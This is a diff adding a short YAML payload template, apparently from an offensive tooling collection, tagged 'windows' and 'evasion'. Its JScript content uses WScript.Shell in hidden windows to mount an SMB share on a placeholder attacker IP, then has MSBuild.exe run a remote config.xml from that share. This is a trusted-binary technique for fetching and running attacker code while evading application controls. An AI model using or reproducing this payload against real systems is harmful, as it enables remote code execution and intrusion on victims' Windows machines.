@@ -1,0 +1,11 @@
+---
+metadata:
+  filename: "msbuild-jscript-smb.yaml"
+  tags: ["windows", "evasion"]
+  created: "2026-06-04"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |
+  var shell = new ActiveXObject("WScript.Shell");
+  shell.Run("cmd /c net use \\\\{{ attacker_ip }}\\share", 0, true);
+  shell.Run("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe \\\\{{ attacker_ip }}\\share\\config.xml", 0, false);
